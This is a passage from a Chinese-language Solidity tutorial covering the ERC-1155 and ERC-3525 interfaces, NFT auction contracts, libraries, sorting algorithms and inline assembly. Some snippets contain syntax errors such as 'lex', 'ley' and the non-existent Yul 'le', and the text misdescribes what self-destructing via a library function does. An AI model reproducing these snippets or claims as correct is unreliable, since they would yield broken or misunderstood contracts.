    /// @return 如果合约实现了 interfaceID 且 interfaceID 不是 0xffffffff，则为 true，否则为 false
    function supportsInterface(bytes4 interfaceID) external view returns (bool);
}

/**
    @title ERC-1155 Multi Token Standard
    @dev See https://eips.ethereum.org/EIPS/eip-1155
    Note: The ERC-165 identifier for this interface is 0xd9b67a26.
 */
interface IERC1155 is IERC165 {
    /**
        @dev Either `TransferSingle` or `TransferBatch` MUST emit when tokens are transferred,
        including zero value transfers as well as minting or burning (see "Safe Transfer Rules" section of 		   the standard).
        The `_operator` argument MUST be the address of an account/contract that is approved to make the 		 transfer (SHOULD be msg.sender).
        The `_from` argument MUST be the address of the holder whose balance is decreased.
        The `_to` argument MUST be the address of the recipient whose balance is increased.
        The `_id` argument MUST be the token type being transferred.
        The `_value` argument MUST be the number of tokens the holder balance is decreased by and match 		what the recipient balance is increased by.
        When minting/creating tokens, the `_from` argument MUST be set to `0x0` (i.e. zero address).
        When burning/destroying tokens, the `_to` argument MUST be set to `0x0` (i.e. zero address).
    */
    event TransferSingle(
        address indexed _operator,
        address indexed _from,
        address indexed _to,
        uint256 _id,
        uint256 _value
    );

    /**
        @dev Either `TransferSingle` or `TransferBatch` MUST emit when tokens are transferred,
        including zero value transfers as well as minting or burning (see "Safe Transfer Rules" section of 		   the standard).
        The `_operator` argument MUST be the address of an account/contract that is approved to make the 		 transfer (SHOULD be msg.sender).
        The `_from` argument MUST be the address of the holder whose balance is decreased.
        The `_to` argument MUST be the address of the recipient whose balance is increased.
        The `_ids` argument MUST be the list of tokens being transferred.
        The `_values` argument MUST be the list of number of tokens (matching the list and order of tokens 		   specified in _ids)
        the holder balance is decreased by and match what the recipient balance is increased by.
        When minting/creating tokens, the `_from` argument MUST be set to `0x0` (i.e. zero address).
        When burning/destroying tokens, the `_to` argument MUST be set to `0x0` (i.e. zero address).
    */
    event TransferBatch(
        address indexed _operator,
        address indexed _from,
        address indexed _to,
        uint256[] _ids,
        uint256[] _values
    );

    /**
        @dev 必须在批准第二方/运营商地址管理所有者地址的所有令牌时启用或禁用（没有事件假定禁用）
    */
    event ApprovalForAll(
        address indexed _owner,
        address indexed _operator,
        bool _approved
    );

    /**
        @dev 必须在为令牌 ID 更新 URI 时发出。
        URI 在 RFC 3986 中定义。
        URI 必须指向符合“ERC-1155 元数据 URI JSON 模式”的 JSON 文件。
    */
    event URI(string _value, uint256 indexed _id);

    /**
        @notice Transfers `_value` amount of an `_id` from the `_from` address
                to the `_to` address specified (with safety call).
        @dev Caller must be approved to manage the tokens being transferred
        out of the `_from` account (see "Approval" section of the standard).
        MUST revert if `_to` is the zero address.
        MUST revert if balance of holder for token `_id` is lower than the `_value` sent.
        MUST revert on any other error.
        MUST emit the `TransferSingle` event to reflect the balance change (see "Safe Transfer Rules" 			section of the standard).
        After the above conditions are met, this function MUST check if `_to` is a smart contract (e.g. 		code size > 0). If so,
        it MUST call `onERC1155Received` on `_to` and act appropriately (see "Safe Transfer Rules" section 			of the standard).
        @param _from    Source address
        @param _to      Target address
        @param _id      ID of the token type
        @param _value   Transfer amount
        @param _data    Additional data with no specified format, MUST be sent unaltered in call to 			`onERC1155Received` on `_to`
    */
    function safeTransferFrom(
        address _from,
        address _to,
        uint256 _id,
        uint256 _value,
        bytes calldata _data
    ) external;

    /**
        @notice 将 `_ids` 的 `_values` 数量从 `_from` 地址转移到指定的 `_to` 地址（使用安全调用）。
        @dev Caller must be approved to manage the tokens being transferred out of the `_from` account 			(see "Approval" section of the standard).
        MUST revert if `_to` is the zero address.
        MUST revert if length of `_ids` is not the same as length of `_values`.
        MUST revert if any of the balance(s) of the holder(s) for token(s) in `_ids` is lower than the 			respective amount(s) in `_values` sent to the recipient.
        MUST revert on any other error.
        MUST emit `TransferSingle` or `TransferBatch` event(s) such that all the balance changes are 			reflected (see "Safe Transfer Rules" section of the standard).
        Balance changes and events MUST follow the ordering of the arrays (_ids[0]/_values[0] before 			_ids[1]/_values[1], etc).
        After the above conditions for the transfer(s) in the batch are met, this function MUST check if 		`_to` is a smart contract (e.g. code size > 0). If so,
        it MUST call the relevant `ERC1155TokenReceiver` hook(s) on `_to` and act appropriately (see "Safe 			Transfer Rules" section of the standard).
        @param _from    Source address
        @param _to      Target address
        @param _ids     每个令牌类型的 ID（顺序和长度必须匹配 _values 数组）
        @param _values  每种代币类型的转账金额（顺序和长度必须匹配 _ids 数组）
        @param _data    没有指定格式的额外数据，必须在调用 _to 上的 `ERC1155TokenReceiver` 钩子时原封不动地发送
    */
    function safeBatchTransferFrom(
        address _from,
        address _to,
        uint256[] calldata _ids,
        uint256[] calldata _values,
        bytes calldata _data
    ) external;

    /**
        @notice 获取帐户令牌的余额。
        @param _owner  令牌持有者的地址
        @param _id     ID of the token
        @return        请求的代币类型的所有者余额
     */
    function balanceOf(address _owner, uint256 _id)
        external
        view
        returns (uint256);

    /**
        @notice 获取多个账户/代币对的余额
        @param _owners 代币持有者的地址
        @param _ids    ID of the tokens
        @return        请求的令牌类型的 _owner 余额（即每个 (owner, id) 对的余额）
     */
    function balanceOfBatch(address[] calldata _owners, uint256[] calldata _ids)
        external
        view
        returns (uint256[] memory);

    /**
        @notice 启用或禁用对第三方（“操作员”）的批准以管理所有调用者的令牌。
        @dev 必须在成功时发出 ApprovalForAll 事件。
        @param _operator  添加到授权运营商集中的地址
        @param _approved  如果运营商获得批准，则为 True，如果撤消批准，则为 false
    */
    function setApprovalForAll(address _operator, bool _approved) external;

    /**
        @notice 查询给定所有者的操作员的批准状态。
        @param _owner     The owner of the tokens
        @param _operator  授权操作员的地址
        @return           如果操作员被批准则为真，否则为假
    */
    function isApprovedForAll(address _owner, address _operator)
        external
        view
        returns (bool);
}
```

















### ERC3525标准

**场景说明：**

描述一组具有相同类型，但是有轻微不同的东西。比如相同的 100 元人民币，一共 100 张，每一张都是价值 100 的纸币，大部分的防伪等等都不同，但是每一张都编号都不同。





**ERC3525标准：**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title EIP-3525 Semi-Fungible Token Standard
 * Note: the EIP-165 identifier for this interface is 0xd5358140.
 */

interface IERC3525  /* is IERC165, IERC721 */ {
    /**
     * @dev MUST emit when value of a token is transferred to another token with the same slot,
     *  including zero value transfers (_value == 0) as well as transfers when tokens are created
     *  (`_fromTokenId` == 0) or destroyed (`_toTokenId` == 0).
     * @param _fromTokenId The token id to transfer value from
     * @param _toTokenId The token id to transfer value to
     * @param _value The transferred value
     */
    event TransferValue(
        uint256 indexed _fromTokenId,
        uint256 indexed _toTokenId,
        uint256 _value
    );

    /**
     * @dev MUST emit when the approval value of a token is set or changed.
     * @param _tokenId The token to approve
     * @param _operator The operator to approve for
     * @param _value The maximum value that `_operator` is allowed to manage
     */
    event ApprovalValue(
        uint256 indexed _tokenId,
        address indexed _operator,
        uint256 _value
    );

    /**
     * @dev MUST emit when the slot of a token is set or changed.
     * @param _tokenId The token of which slot is set or changed
     * @param _oldSlot The previous slot of the token
     * @param _newSlot The updated slot of the token
     */
    event SlotChanged(
        uint256 indexed _tokenId,
        uint256 indexed _oldSlot,
        uint256 indexed _newSlot
    );

    /**
     * @notice Get the number of decimals the token uses for value - e.g. 6, means the user
     *  representation of the value of a token can be calculated by dividing it by 1,000,000.
     *  Considering the compatibility with third-party wallets, this function is defined as
     *  `valueDecimals()` instead of `decimals()` to avoid conflict with EIP-20 tokens.
     * @return The number of decimals for value
     */
    function valueDecimals() external view returns (uint8);

    /**
     * @notice Get the value of a token.
     * @param _tokenId The token for which to query the balance
     * @return The value of `_tokenId`
     */
    function balanceOf(uint256 _tokenId) external view returns (uint256);

    /**
     * @notice Get the slot of a token.
     * @param _tokenId The identifier for a token
     * @return The slot of the token
     */
    function slotOf(uint256 _tokenId) external view returns (uint256);

    /**
     * @notice Allow an operator to manage the value of a token, up to the `_value`.
     * @dev MUST revert unless caller is the current owner, an authorized operator, or the approved
     *  address for `_tokenId`.
     *  MUST emit the ApprovalValue event.
     * @param _tokenId The token to approve
     * @param _operator The operator to be approved
     * @param _value The maximum value of `_toTokenId` that `_operator` is allowed to manage
     */
    function approve(
        uint256 _tokenId,
        address _operator,
        uint256 _value
    ) external payable;

    /**
     * @notice Get the maximum value of a token that an operator is allowed to manage.
     * @param _tokenId The token for which to query the allowance
     * @param _operator The address of an operator
     * @return The current approval value of `_tokenId` that `_operator` is allowed to manage
     */
    function allowance(uint256 _tokenId, address _operator)
        external
        view
        returns (uint256);

    /**
     * @notice Transfer value from a specified token to another specified token with the same slot.
     * @dev Caller MUST be the current owner, an authorized operator or an operator who has been
     *  approved the whole `_fromTokenId` or part of it.
     *  MUST revert if `_fromTokenId` or `_toTokenId` is zero token id or does not exist.
     *  MUST revert if slots of `_fromTokenId` and `_toTokenId` do not match.
     *  MUST revert if `_value` exceeds the balance of `_fromTokenId` or its allowance to the
     *  operator.
     *  MUST emit `TransferValue` event.
     * @param _fromTokenId The token to transfer value from
     * @param _toTokenId The token to transfer value to
     * @param _value The transferred value
     */
    function transferFrom(
        uint256 _fromTokenId,
        uint256 _toTokenId,
        uint256 _value
    ) external payable;

    /**
     * @notice 转移将指定数量的代币到新地址。调用者应确认 _to 能够接收 EIP-3525 资产。
     * @dev This function MUST create a new EIP-3525 token with the same slot for `_to`,
     *  or find an existing token with the same slot owned by `_to`, to receive the transferred value.
     *  MUST revert if `_fromTokenId` is zero token id or does not exist.
     *  MUST revert if `_to` is zero address.
     *  MUST revert if `_value` exceeds the balance of `_fromTokenId` or its allowance to the
     *  operator.
     *  MUST emit `Transfer` and `TransferValue` events.
     * @param _fromTokenId The token to transfer value from
     * @param _to The address to transfer value to
     * @param _value The transferred value
     * @return ID of the token which receives the transferred value
     */
    function transferFrom(
        uint256 _fromTokenId,
        address _to,
        uint256 _value
    ) external payable returns (uint256);
}
```







### 四种代币标准的对比



#### 荷兰拍卖

**原理：**

拍卖 NFT

- 需要拥有 NFT
- 需要在 NFT 合约内对拍卖合约做 `aoorove`;



**代码：**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IERC721 {
    function transferFrom(
        address _form,
        address _to,
        uint256 _nftId
    ) external;
}

contract DutchAuction {
    uint256 private immutable duration;

    address payable public immutable seller;

    IERC721 public immutable nft;
    uint256 public immutable nftId;

    uint256 public immutable startingPrice;
    uint256 public immutable startAt;
    uint256 public immutable endAt;
    uint256 public immutable discountRate;

    constructor(
        address _nft,
        uint256 _nftId,
        uint256 _startingPrice,
        uint256 _duration,
        uint256 _discountRate
    ) {
        require(
            _startingPrice >= _duration * _discountRate,
            "starting price < discount"
        );
        seller = payable(msg.sender);
        nft = IERC721(_nft); // 需要 IERC721 进行转换
        nftId = _nftId;
        duration = _duration;
        startingPrice = _startingPrice;
        discountRate = _discountRate;

        startAt = block.timestamp;
        endAt = block.timestamp + _duration;
    }

    // 获取价格
    function getPrice() public view returns (uint256) {
        uint256 timeElapsed = block.timestamp - startAt;
        uint256 discount = discountRate * timeElapsed;
        return startingPrice - discount;
    }

    // 购买
    function buy() external payable {
        // 打包时间需要在拍卖截止之前
        require(block.timestamp < endAt, "Auction has ended");

        uint256 price = getPrice();
        require(msg.value >= price, "Insufficient amount");
        nft.transferFrom(seller, msg.sender, nftId);

        // 如果有多余的钱，需要把钱退会购买者账号(提交时间和打包确认时间不一致)
        uint256 refund = msg.value - price;
        if (refund > 0) {
            payable(msg.sender).transfer(refund);
        }
        selfdestruct(seller);
    }
}
```







#### 英式拍卖

**原理：**

拍卖 NFT

- 需要拥有 NFT
- 需要在 NFT 合约内对拍卖合约做 `aoorove`;





**代码：**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IERC721 {
    function transferFrom(
        address _form,
        address _to,
        uint256 _nftId
    ) external;
}

// TODO: 区块注释信息，可以选择在合约完成后删除
contract HelloComrades {
    /*
     * ========================================
     * State Variables
     * ========================================
     */

    address payable public immutable seller;

    IERC721 public immutable nft;
    uint256 public immutable nftId;

    uint32 public endAt; // 结束时间
    bool public started; // 开始时间
    bool public ended; // 结束时间

    uint256 public highestBid; // 最高出价
    address public highestBider; // 最高出价人
    mapping(address => uint256) public bids; // 除了最高出价外的所有出价人

    /*
     * ========================================
     * Events
     * ========================================
     */
    event Start();
    event End(address highestBider, uint256 amount);
    event Bid(address indexed sender, uint256 amount);
    event Withdraw(address indexed sender, uint256 amount);

    /*
     * ========================================
     * Modifier
     * ========================================
     */

    /*
     * ========================================
     * Errors
     * ========================================
     */

    /*
     * ========================================
     * Constructor
     * ========================================
     */
    constructor(
        address _nft,
        uint256 _nftId,
        uint256 _startingPrice
    ) {
        seller = payable(msg.sender);
        nft = IERC721(_nft); // 需要 IERC721 进行转换
        nftId = _nftId;
        highestBid = _startingPrice;
    }

    /*
     * ========================================
     * Functions
     * ========================================
     */
    function start() external {
        require(msg.sender == seller, "Nor seller");
        require(!started, "started");

        started = true;
        endAt = uint32(block.timestamp + 60);
        nft.transferFrom(seller, address(this), nftId);

        emit Start();
    }

    function bid() external payable {
        require(started, "Not started"); //需要时间已经开始
        require(block.timestamp < endAt, "ended"); // 需要时间还没有过期
        require(msg.value > highestBid, "invalid price"); // 需要高于上次出价

        // 把上一次最高出价和出价人写入账本
        if (highestBider != address(0)) {
            bids[highestBider] += highestBid;
        }

        // 更新最高出价/最高出价人
        highestBid = msg.value;
        highestBider = msg.sender;
        emit Bid(msg.sender, msg.value);
    }

    // 取回自己的出价
    function withdraw() external {
        uint256 bal = bids[msg.sender];
        require(bal > 0, "No amount can be refunded");
        bids[msg.sender] = 0; //为了防止漏洞发生，需要先把状态修改
        payable(msg.sender).transfer(bal);
        emit Withdraw(msg.sender, bal);
    }

    // 结束拍卖;不需要做身份确认，因为需要做的事情是固定的，
    // 能不做身份判断就不需要做，可以节省Gas
    function end() external {
        require(started, "Not started"); // 需要已经开始
        require(!ended, "is ended"); // 需要还没有结束
        require(block.timestamp >= endAt, "auction in progress");
        ended = true;

        if (highestBider != address(0)) {
            // 如果有人出价则将 NFT 给最高出价人，最高价格给销售者
            nft.transferFrom(address(this), highestBider, nftId);
            seller.transfer(highestBid);
        } else {
            // 如果没有人出价，则NFT原路返还给销售者
            nft.transferFrom(address(this), seller, nftId);
        }
        emit End(highestBider, highestBid);
    }

    /*
     * ========================================
     * Helper
     * ========================================
     */
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

**测试流程：**

- 部署 ERC721 ,NFT 合约地址是 `nftContractAds`

- 给 `address1` min 一个 ID 是 1 的 NFT

- 部署英式拍卖合约

   

  ```
  EnglishAuction
  ```

  - 输入 NFT 合约地址
  - 输入 NFT ID 号
  - 起拍价格:8

- 在 `nftContractAds` 中 approve `EnglishAuction` , ID 为 1 的 NFT

- 使用 `address2` 出价 1,查看是否返回错误 `Not started`

- 查看合约的状态

  - `started`
  - `ended`
  - `getBalance`
  - `seller`
  - `nft`
  - `nftId`
  - `highestBider`
  - `highestBid`

- 使用 `address1` 出价 1, 开始拍卖合约，查看是否返回错误 `invalid price`

- 再次查看合约的状态

- 使用 `address2` 出价 10

- 使用 `address3` 出价 20

- 使用 `address2` 出价 50

- 查询 `address2` 可退换的主币

- 查询 `address3` 可退换的主币

- 结束拍卖

- 使用 `address2` 取回主币

- 使用 `address3` 取回主币



















## Library库

库library是智能合约的精简版，如智能合约一样，位于区块链上，包含了可以被其他合约使用的代码。**库合约有两种使用方法，直接调用和`using...for..`使用。**



### 库合约与普通智能合约的区别

库的目的是只需要在特定的地址部署一次，它们的代码可以通过EVM的`	delegatecall`特性进行重用。即如果库函数被调用，它的代码在调用合约的上下文执行，即`this`指向调用合约。注意：它访问的是调用合约的存储状态。因为每个库都是一段独立的代码，所以它仅能访问调用合约明确提供的状态变量（否则它就无法通过名字访问这些变量）。

+ ==库不能有任何状态变量==
+ ==库不能继承其他合约==
+ ==**库合约函数的可视范围通常为`internal`，可变性为`pure`**，对所有使用它的合约可见==。
  + 定义成`external`毫无意义，因为库合约函数只能在内部使用，不能独立运行。
  + 定义成`private`也不行，因为其他合约无法使用。
+ ==禁止使用`fallback、receive`函数==，所以导致**不能接收代币**
+ Library被销毁后，则所有方法恢复为初始值，功能失效。
+ 使用库library的合约，可以将库合约视为隐式的父合约，当然它们不能显示的出现继承关系中。即==不需要使用`is`来继承，可以在合约中直接使用。==
+ 按照规范，库合约的名字首字母需要大写（大驼峰命名方式）
+ **特别注意：库中是没有代币，没有payable，没有fallback和receive**



可以通过类型转换，将库类型转换成`address`类型，如：使用`address(LibraryName)`，由于编译器无法知道库的部署位置，编译器会生成`__$30bbc0abd4d6364515865950d3e0d10953$__`形式的占位符，该占位符是完整的库名称的 keccak256 哈希的十六进制编码的 34 个字符的前缀，例如：如果该库存储在 libraries 目录中名为 bigint.sol 的文件中，则完整的库名称为`libraries/bigint.sol:BigInt`。



此类字节码不完整的合约，不应该部署。占位符需要替换为实际地址。你可以通过在编译库时将它们传递给编译器或使用链接器更新已编译的二进制文件来实现。有关如何使用命令行编译器进行链接的信息，请参见 [`library-linking`](https://learnblockchain.cn/docs/solidity/using-the-compiler.html#/library-linking) 。





### 直接调用库合约的方法

```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

library Math{
	function max(uint256 _x,uint256 _y)internal pure returns(uint256){
		return _x>_y?_x:_y;
	}
}

contract Test{
	function testMax(uint256 _x,uint256 _y)external pure returns(uint256){
		return Math.max(_x,_y);
	}
}
```







### `using...for...`使用库合约

可以使用`using ... for...`更方便的使用库合约。



例如：`using A for B`用来将A库里定义的函数附着到类型B。**这些函数将默认接收调用函数对象的实例作为第一个参数。**

using For 可在文件或合约内部及合约级都是有效的。

核心如下:

```solidity
using ArrayLib for uint256[];   //将ArrayLib对给类型均有效，该类型可以直接调用ArrayLib库中的方法
uint256[] public arr = [10, 11, 12, 13, 14,...];
...
arr.find(15); // 直接使用
```



**示例：**

```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

library ArrayLib{
	function find(uint256[] storage _arr,uint256 _value)internal view returns(uint256){
		for (uint256 index = 0;index<_arr.length;index++){
			if (_arr[index] == _value){
				return index;
			}
		}
		revert("Not Found");
	}
}


contract Test{
	//using for 可以让所有 uint256[]数据，都具有ArrayLib内的方法
	
	using ArrayLib for uint256[];
	
	uint256[] public arr = [10,11,12,13,14,15,16,17,18,19];
	
	function test1()external view returns(uint256){
		
		//return ArrayLib.find(arr,15); //这是第一种方式
		
		//可以直接使用arr.find，而不需要额外修改ArrayLib内的代码
		return arr.find(15);
	}
}
```







**`using ... for ...`其他用法：**

第一部分 `A` 可以是以下之一：

- **一些库或文件级的函数列表(`using {f, g, h, L.t} for uint;`)，仅是库中某些函数被附加到类型。**
- **库名称 (`using L for uint;`) ，库里所有的函数(包括 public 和 internal 函数) 被附加到类型上。**

在文件级，第二部分 `B` 必须是一个显式类型（不用指定数据位置）

在合约内，**你可以使用 `using L for *;`， 表示库 `L`中的函数被附加在所有类型上。**

如果你指定一个库，库内所有函数都会被加载，即使它们的第一个参数类型与对象的类型不匹配。类型检查会在函数调用和重载解析时执行。

如果你使用函数列表 (`using {f, g, h, L.t} for uint;`)， 那么类型
(`uint`) 会隐式的转换为这些函数的第一个参数。
即便这些函数中没有一个被调用，这个检查也会进行。

`using A for B;` 指令仅在当前作用域有效（要么是合约中，或当前模块、或源码单元），包括在作用域内的所有函数，在合约或模块之外则无效。

当 `using for` 指令在文件级别使用，并应用于一个用户定义类型（在用一个文件定义的文件级别的用户类型），`global` 关键字可以添加到末尾。产生的效果是，这些函数被附加到使用该类型的任何地方（包括其他文件），而不仅仅是声明处所在的作用域。



**在下面的例子中，我们将使用库：**

```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

library Search{
	function indexOf(uint[] storage self,uint value) public view returns(uint){
		for (uint i=0;i<self.length;i++){
			if (self[i] == value){
				return i;
			}
		}
		return type(uint).max;
	}
}

using Search for uint[];


contract C{
	using Search for uint[];
	uint[] data;
	
	function append(uint value)public {
		data.push(value);
	}
	
	function replace(uint from,uint to)public{
		//执行库函数调用
		uint index = data.indexOf(from);
		if (index == type(uint).max){
			data.push(to);
		}else{
			data[index] =to;
		}
	}
}
```

注意，所有 external 库调用都是实际的 EVM 函数调用。这意味着如果传递内存或值类型，都将产生一个副本，即使是 `self` 变量。 引用存储变量或者 internal 库调用 是唯一不会发生拷贝的情况。









### 直接调用和`using...for...`对比

- using for 更符合语义化
- ==**库合约使用 using for 比直接使用更省 gas**==

```solidity
/ SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

library Sum {
    function sum(uint256[] memory _data) public pure returns (uint256 temp) {
        for (uint256 i = 0; i < _data.length; ++i) {
            temp += _data[i];
        }
    }
}

contract Test {
    using Sum for uint256[];
    uint256[] data;

    constructor() {
        data.push(1);
        data.push(2);
        data.push(3);
        data.push(4);
        data.push(5);
    }

    // 43874 gas
    function sumA1() external view returns (uint256) {
        return Sum.sum(data);
    }

    // 43531 gas
    function sumA2() external view returns (uint256) {
        return data.sum();
    }
}
```





### 销毁库合约

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

library Math {
    function max(uint256 _x, uint256 _y) internal pure returns (uint256) {
        return _x > _y ? _x : _y;
    }
    
    
	//销毁库合约
	//特别注意：库中是没有代币，没有payable，没有fallback和receive
	
    function kill() internal {
        selfdestruct(payable(msg.sender));
    }

    // Libraries cannot have fallback functions.
    // fallback() external {}

    // Libraries cannot have receive ether functions.
    // receive() external payable {}
}

contract Test {
    function testMax(uint256 _x, uint256 _y) external pure returns (uint256) {
        return Math.max(_x, _y);
    }

    function testKill() external {
        return Math.kill();
    }
}
```

- 执行 `Test.testMax`
- 执行 `Test.testKill`
- 再次执行 `Test.testMax`，发现结果是默认值



### 扩展：库的调用保护

如果库的代码是通过 `CALL` 来执行，而不是 `DELEGATECALL` 那么执行的结果会被回退，除非是对 `view` 或者 `pure` 函数的调用。EVM 没有为合约提供检测是否使用 `CALL` 的直接方式，但是合约可以使用`ADDRESS` 操作码找出正在运行的"位置"。生成的代码通过比较这个地址和构造时的地址来确定调用模式。

更具体地说，库的运行时代码总是从一个 push 指令开始，它在编译时是 20 字节的零。当运行部署代码时，这个常数被内存中的当前地址替换，修改后的代码存储在合约中。在运行时，部署时地址就成为了第一个被 push 到堆栈上的常数， 对于任何 non-view 和 non-pure 函数，调度器代码都将对比当前地址与这个常数是否一致。这意味着库在链上存储的实际代码与编译器输出的 `deployedBytecode` 的编码是不同。











## 算法



### 插入排序

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

// [11,2,31,45,6,78,37,33,21]
//           => [2, 6, 11, 21, 31, 33, 37, 45, 78]
// 47897 gas
// ...
// 41125 gas
contract Demo {
    // 47897 gas
    function insertSort(uint256[] calldata ary)
        public
        pure
        returns (uint256[] memory)
    {
        uint256[] memory tempArr = ary;
        uint256 temp; //定义一个临时变量，保存要插入的值；
        uint256 len = tempArr.length;
        uint256 pIndex; // 上一个值
        for (uint256 i = 1; i < len; ++i) {
            temp = tempArr[i]; //需要插入的值；
            pIndex = i;
            while (pIndex >= 1 && temp < tempArr[pIndex - 1]) {
                tempArr[pIndex] = tempArr[pIndex - 1]; //相当于ary[i]=ary[i-1];
                --pIndex; //准备下一波交换；
            }
            tempArr[pIndex] = temp; //相当于ary[i-1]=temp; 因为上面 pIndex-- 了
        }
        return tempArr;
    }
}
```



### 冒泡排序

冒泡排序（Bubble Sort）也是一种简单直观的排序算法。它重复地走访过要排序的数列，一次比较两个元素，如果他们的顺序错误就把他们交换过来。走访数列的工作是重复地进行直到没有再需要交换，也就是说该数列已经排序完成。这个算法的名字由来是因为越小的元素会经由交换慢慢“浮”到数列的顶端。
算法步骤：

- 1）比较相邻的元素。如果第一个比第二个大，就交换他们两个。
- 2）对每一对相邻元素作同样的工作，从开始第一对到结尾的最后一对。这步做完后，最后的元素会是最大的数。
- 3）针对所有的元素重复以上的步骤，除了最后一个。
- 4）持续每次对越来越少的元素重复上面的步骤，直到没有任何一对数字需要比较。

```solidity
contract Demo2 {
    function sortAry(uint256[] calldata ary)
        public
        pure
        returns (uint256[] memory)
    {
        uint256[] memory tempArr = ary;
        uint256 len = tempArr.length; //获取数组的长度；有aryLen个数在排序；
        uint256 temp; //临时变量，交换数据中用的
        bool flag = false; //设置标志位，初始化为false
        for (uint256 i = 0; i < len - 1; ++i) {
            //外层循环n-1次；
            for (uint256 j = 0; j < len - 1 - i; ++j) {
                //每次循环完，都能从剩下的数组中找出个最大的数组放在 len-1-i 的位置；
                if (tempArr[j] > tempArr[j + 1]) {
                    temp = tempArr[j];
                    tempArr[j] = tempArr[j + 1];
                    tempArr[j + 1] = temp;
                    flag = true; //如果交换好了，做个标记，避免无效的循环；
                }
            }
            if (!!flag) {
                //只要交换了位置，flag的值就重新设置为false了；
                flag = false;
            } else {
                //如果没有交换，说明数组已经排好序了，可以结束循环了；
                break;
            }
        }
        return tempArr;
    }
}
```











## Assembly内联汇编

内联汇编可以在solidity源程序中嵌入汇编代码，**对EVM有更细粒度的控制**。内联汇编主要在编写库函数很有用，一般用于编写工具函数，比如椭圆曲线签名解析等。在项目中用汇编编主要是 opensea 的 [seaport](https://github.com/ProjectOpenSea/seaport) 合约.



在合约的内部使用汇编，是在合约内部包含 `assembly` 关键字进行编写的，在 Solidity `inline assembly`(内联汇编) 中的语言被称为 Yul。[Yul](https://docs.soliditylang.org/zh/latest/yul.html) 除了在 Solidity 之中作为 inline assembly 的一部分，也能当作独立的直译语言能够被编译成 bytecode 给不同的后端。



==注意：内联汇编是一种在底层访问以太坊虚拟机的语言，由于编译器无法对汇编语句进行检查，所以 Solidity 提供的很多重要安全特性都没办法作用于汇编。==写汇编代码相对比较困难，很多时候只有在处理一些相对复杂的问题时才需要使用它，并且开发者需要明确知道自己要做什么。







### Assembly基本格式

**通过`assembly{}`包裹代码。并且内部每一行语句都不需要使用`;`显示的标注结束**。`Assembly`使用`//`和`/*   */`来进行注释。

⚠️ 注意： Inline Assembly 中，**代码块之间是不能彼此沟通的，==里面声明的变量都是局部变量==**



```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

contract Demo{
	
	function demoAssembly() public pure{
		
		assembly{
			lex x := 3
			{
				let y := x  //内部可以访问外部				
			}//运行到此处会销毁y
		}
	}
}
```





**简单加法示例：**

下面是一个计算 `_x + _y` 的两种写法对比，汇编的语法节省了 `1.76%` 的 gas。 **assembly 核心是更细粒度的控制**，省 gas 只是它的外在表现。

```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

contract Demo{
	function addSolidity(uint256 _x,uint256 _y) public pure returns(uint256){
		return (_x+_y);
	}
	
	function addAssembly(uint256 _x,uint256 _y) public pure returns(uint256){
		assembly{
			//add(_x+_y)是加法函数
			let result := add(_x,_y)
			
			// mstore(0x0, result) 在内存 `0x0` 的位置储存 `result`
			mstore(0x0,result)
            
            //从内存索引为0x0位置内存返回32字节
            return (0x0,32)
		}
	}
}
```











### Assembly语言基础

Yul 提供了高级结构，如 `for` 循环、`if` 语句 `switch` 和函数调用等等，下面按照分类进行介绍。

在 Inline Assembly 中，以下几个点很重要：

- 赋值: 使用的是`:=`，而不是`=`。
- 声明变量: 使用 `let` 声明；（不是正常带有指定类型的强类型方式）





#### 声明和赋值

```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

contract Demo{
	
	function demoAssembly()public pure returns(uint256){
		assembly{
			lex x:=2  //变量声明和初始化一起
			
			ley y
			y:=2    //先声明，后赋值
			
			let d := "hello,world"  //注意：内联汇编中，字符串最多只能为32个字符，超过该长度会报错
		}
	}
}
```













### Assembly条件判断



#### if

if 特点：

+ 只有`if`，没有`else`
+ `if`语句强制要求代码块使用大括号，`{}`不能省略

```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

contract Demo{
	
	function demoAssembly() public pure{
		uint256 x;
		assembly{
		
			//注意：这里的if写法，类似于go语言，没有小括号包裹表达式
			if iszero(x){ 
				x:=sub(1,x)
			}
		}
	}
}
```







#### switch

switch语句支持一个默认分支`default`，当表达式的值不匹配任何其他分支条件，将执行默认分支的代码。

```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

contract Demo{
	
	function demoAssembly(uint256 x) public pure returns(uint256 result){
		
		assembly{
		
			//注意：这里switch的写法，和其他语言都不一样
			switch x
			case 0{
				result:=0
			}
			case 1{
				result := 1
			}
			default{
				result := mul(x,x)
			}
			
		}
	}
}
```











### Assembly for循环

`for`循环包含了三个元素

+ 初始化：比如：`let i:=0`
+ 执行条件：如`lt(i,n)`
+ 迭代后续步骤：如`add(i,1)`



```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

contract Demo{
	
	function demoAssembly() public returns(uint256 result){
		uint256 length = 10;
		
		assembly{
		
		//注意：for循环的写法，很特殊，要小心
			for{let i:=0} le(i,length) {i:=add(i,1)}{
				result := add(result,i)
			}
		}
	}
}
```

==**注意：在内联汇编中，for循环可以使用`continue`和`break`。**==









### Assembly函数的定义和使用

函数运行机制：

+ 从堆栈提取参数
+ 将结果压入堆栈
+ 和solidity函数不同，**不需要指定汇编函数的可见性**



```solidity
//SPDX-License-Identifier:MIT

pragma solidity ^0.8.19;

contract Demo{
	
	function demoAssembly() public pure returns(uint256 free_memory_pointer){
		
		assembly{
			
			//函数定义
			function allocate(length) ->pos{
				pos := mload(0x40)
				mstore(0x40,add(pos,length))
			}
			
			//函数使用
			free_memory_pointer := allocate(64)
		}
	}
}
```









### EVM内置函数和内置操作码



标有 F、H、B、C 、I 和 L 分别自出现的时间，对应的如下

- `F`: Frontier
- `H`: Homestead
- `B`: Byzantium
